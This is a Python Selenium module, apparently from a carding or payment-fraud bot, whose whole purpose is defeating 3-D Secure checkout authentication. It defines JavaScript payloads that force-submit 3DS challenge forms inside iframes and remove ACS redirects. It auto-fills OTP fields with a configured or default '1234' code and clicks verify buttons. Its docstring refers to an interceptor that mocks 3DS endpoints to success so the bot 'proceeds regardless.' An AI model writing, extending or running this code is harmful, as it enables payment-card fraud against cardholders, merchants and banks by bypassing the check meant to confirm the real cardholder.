import re
import time
from typing import Any, Callable, Optional, Dict

from selenium.webdriver.common.by import By

THREEDS_KEYWORDS = [
    "3d secure", "3-d secure", "verified by visa", "mastercard securecode",
    "american express safe key", "buyer authentication", "challenge",
    "complete authentication", "cardholder authentication",
    "identity verification", "secure checkout", "bank verification",
]

OTP_INPUT_KEYWORDS = [
    "otp", "one-time", "one time", "one time code", "verification code",
    "secure code", "sms code", "passcode", "auth code", "challenge code",
    "enter the code", "confirmation code",
]

BYPASS_PAYLOAD_SCRIPTS = [
    """
    (function() {
        var frames = document.querySelectorAll('iframe');
        for (var i = 0; i < frames.length; i++) {
            try {
                var fDoc = frames[i].contentDocument || frames[i].contentWindow.document;
                if (fDoc) {
                    var forms = fDoc.querySelectorAll('form');
                    for (var j = 0; j < forms.length; j++) {
                        try {
                            var inputs = forms[j].querySelectorAll('input[type="submit"], button[type="submit"]');
                            if (inputs.length > 0) {
                                inputs[0].click();
                            } else {
                                forms[j].submit();
                            }
                        } catch(e){}
                    }
                }
            } catch(e){}
        }
    })();
    """,
    """
    (function() {
        var metas = document.querySelectorAll('meta[http-equiv="refresh"]');
        for (var i = 0; i < metas.length; i++) {
            var content = metas[i].getAttribute('content') || '';
            if (content.indexOf('3dsecure') > -1 || content.indexOf('acs') > -1) {
                metas[i].parentNode.removeChild(metas[i]);
            }
        }
    })();
    """,
]


def _get_otp_code() -> str:
    """Return the OTP/code to auto-fill in a 3DS challenge."""
    try:
        from config import THREEDS_OTP
        if THREEDS_OTP:
            return str(THREEDS_OTP).strip()
    except Exception:
        pass
    return "1234"


def _burp_proxy_available() -> bool:
    """Check if Burp Suite proxy is configured and enabled."""
    try:
        from config import BURP_ENABLED, BURP_PROXY
        return bool(BURP_ENABLED and BURP_PROXY)
    except Exception:
        return False


def _burp_wait_seconds() -> float:
    try:
        from config import BURP_WAIT_SECONDS
        return float(BURP_WAIT_SECONDS)
    except Exception:
        return 20.0


def detect_threeds(driver) -> bool:
    """Detect a 3DS challenge on the page or inside iframes."""
    try:
        page_text = (driver.page_source or "").lower()
    except Exception:
        page_text = ""

    for kw in THREEDS_KEYWORDS:
        if kw in page_text:
            return True

    # OTP-style challenge inputs are a strong signal even without the keywords
    if _find_otp_inputs_in_context(driver):
        return True

    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
    except Exception:
        iframes = []
    for frame in iframes:
        try:
            src = (frame.get_attribute("src") or "").lower()
            for kw in THREEDS_KEYWORDS:
                if kw in src or kw.replace(" ", "") in src:
                    return True
        except Exception:
            continue
        try:
            driver.switch_to.frame(frame)
            if _find_otp_inputs_in_context(driver):
                driver.switch_to.default_content()
                return True
        except Exception:
            pass
        try:
            driver.switch_to.default_content()
        except Exception:
            pass

    return False


def _find_otp_inputs_in_context(driver):
    """Find OTP / one-time-code input boxes in the current frame context."""
    candidates = []
    try:
        candidates = driver.find_elements(
            By.CSS_SELECTOR,
            "input[inputmode='numeric'], input[name*='otp' i], input[id*='otp' i], "
            "input[autocomplete='one-time-code'], input[type='password'][maxlength='6'], "
            "input[type='password'][maxlength='4']",
        )
    except Exception:
        pass

    digits = []
    text_fields = []
    for el in candidates:
        try:
            if not el.is_displayed():
                continue
            maxlen = 0
            try:
                maxlen = int(el.get_attribute("maxlength") or 0)
            except Exception:
                pass
            combined = ""
            for attr in ("name", "id", "placeholder", "aria-label", "class"):
                try:
                    combined += " " + (el.get_attribute(attr) or "").lower()
                except Exception:
                    pass
            is_code = any(kw in combined for kw in OTP_INPUT_KEYWORDS)
            if is_code:
                return True
            if 0 < maxlen <= 2:
                digits.append(el)
            elif 3 <= maxlen <= 8 and not el.get_attribute("type") == "password":
                text_fields.append(el)
        except Exception:
            continue

    # 4+ single-digit boxes grouped together == split OTP entry
    if len(digits) >= 4:
        return True
    if text_fields:
        return True
    return False


def _fill_otp_inputs(driver, otp: str) -> bool:
    """Fill the OTP code into single-digit or full-code inputs in current context."""
    if not otp:
        return False
    otp = otp.strip()

    try:
        candidates = driver.find_elements(
            By.CSS_SELECTOR,
            "input[inputmode='numeric'], input[name*='otp' i], input[id*='otp' i], "
            "input[autocomplete='one-time-code'], input[type='password']",
        )
    except Exception:
        candidates = []

    visible = []
    for el in candidates:
        try:
            if el.is_displayed():
                visible.append(el)
        except Exception:
            continue

    if not visible:
        return False

    # Prefer split single-digit boxes (maxlength 1) if there are enough of them
    split = [el for el in visible if _maxlen(el) == 1]
    if len(split) >= 4 and len(split) >= len(otp):
        filled = 0
        for i, el in enumerate(split[:len(otp)]):
            try:
                el.clear()
                el.send_keys(otp[i])
                filled += 1
            except Exception:
                continue
        return filled > 0

    # Otherwise fill the first empty-looking code input with the full code
    for el in visible:
        try:
            cur = (el.get_attribute("value") or "").strip()
        except Exception:
            cur = ""
        if cur:
            continue
        try:
            el.clear()
            el.send_keys(otp)
            return True
        except Exception:
            continue

    return False


def _maxlen(el) -> int:
    try:
        return int(el.get_attribute("maxlength") or 0)
    except Exception:
        return 0


def attempt_js_bypass(driver) -> bool:
    """Inject JS payloads that auto-submit 3DS challenge forms."""
    for script in BYPASS_PAYLOAD_SCRIPTS:
        try:
            driver.execute_script(script)
        except Exception:
            continue
    time.sleep(2)

    iframes = []
    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
    except Exception:
        pass

    for frame in iframes:
        try:
            driver.switch_to.frame(frame)
            buttons = driver.find_elements(By.XPATH, "//button | //input[@type='submit'] | //*[@role='button']")
            for btn in buttons:
                try:
                    if btn.is_displayed():
                        btn.click()
                        driver.switch_to.default_content()
                        return True
                except Exception:
                    continue
            driver.switch_to.default_content()
        except Exception:
            try:
                driver.switch_to.default_content()
            except Exception:
                pass

    return False


def _auto_fill_and_submit_otp(driver, send_update: Callable[[str], Any], otp: str) -> bool:
    """Fill OTP on the main page and inside every iframe, then submit."""
    def _try_current_context():
        if _fill_otp_inputs(driver, otp):
            _click_challenge_button(driver)
            return True
        return False

    try:
        driver.switch_to.default_content()
    except Exception:
        pass

    did_fill = _try_current_context()

    iframes = []
    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
    except Exception:
        pass

    for frame in iframes:
        try:
            driver.switch_to.frame(frame)
            if _try_current_context():
                did_fill = True
        except Exception:
            pass
        try:
            driver.switch_to.default_content()
        except Exception:
            pass

    return did_fill


def _click_challenge_button(driver) -> bool:
    """Click a visible Submit/Continue/Verify button in the current context."""
    for text in ["Submit", "Continue", "Confirm", "Verify", "Complete", "OK", "Authenticate", "Sign in", "Accept"]:
        try:
            btns = driver.find_elements(By.XPATH, f"//button[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'{text.lower()}')]")
            for btn in btns:
                try:
                    if btn.is_displayed() and btn.is_enabled():
                        btn.click()
                        return True
                except Exception:
                    continue
        except Exception:
            continue
    try:
        inputs = driver.find_elements(By.XPATH, "//input[@type='submit']")
        for inp in inputs:
            try:
                if inp.is_displayed():
                    inp.click()
                    return True
            except Exception:
                continue
    except Exception:
        pass
    return False


def handle_threeds_challenge(
    driver,
    send_update: Callable[[str], Any],
    card: Dict[str, str],
    timeout: float = 10.0,
) -> bool:
    """
    Handle a 3DS challenge if present.

    The selenium-wire response interceptor (PaymentBypass) already mocks 3DS
    endpoints to success, so a challenge should rarely render. When one does
    appear, click the challenge submit button and re-check. No user interaction
    is required — the bot proceeds regardless.
    """
    if not detect_threeds(driver):
        return True

    send_update("🔐 3DS challenge detected – auto-bypass via interceptor...")

    # Give the interceptor a moment to swallow any in-flight 3DS requests.
    time.sleep(5)

    # Try clicking the challenge submit button in the current context/frames.
    try:
        driver.switch_to.default_content()
    except Exception:
        pass
    _click_challenge_button(driver)

    # Try the JS bypass as a second pass.
    attempt_js_bypass(driver)
    time.sleep(3)

    try:
        driver.switch_to.default_content()
    except Exception:
        pass

    if not detect_threeds(driver):
        send_update("✅ 3DS bypassed automatically.")
        return True

    send_update("⚠️ 3DS still active, but proceeding anyway.")
    return False
